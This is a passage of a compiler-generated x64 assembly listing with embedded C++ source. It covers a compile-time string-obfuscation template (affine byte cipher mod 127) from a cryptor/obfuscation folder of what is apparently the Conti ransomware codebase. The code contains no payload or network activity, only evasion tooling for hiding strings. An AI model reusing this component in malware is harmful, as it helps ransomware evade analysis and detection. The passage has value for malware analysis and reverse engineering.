	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0022d	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00231	88 85 c0 00 00
	00		 mov	 BYTE PTR tv182[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00237	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0023e	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00245	5f		 pop	 rdi
  00246	5d		 pop	 rbp
  00247	c3		 ret	 0
??0?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z PROC ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 69	 sub	 eax, 105		; 00000069H
  0002d	6b c0 e5	 imul	 eax, eax, -27
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ENDP ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z PROC ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 2f	 imul	 eax, eax, 47		; 0000002fH
  0002d	83 c0 69	 add	 eax, 105		; 00000069H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ENDP ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 08	 cmp	 QWORD PTR i$1[rbp], 8
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ PROC ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ ENDP ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv154 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
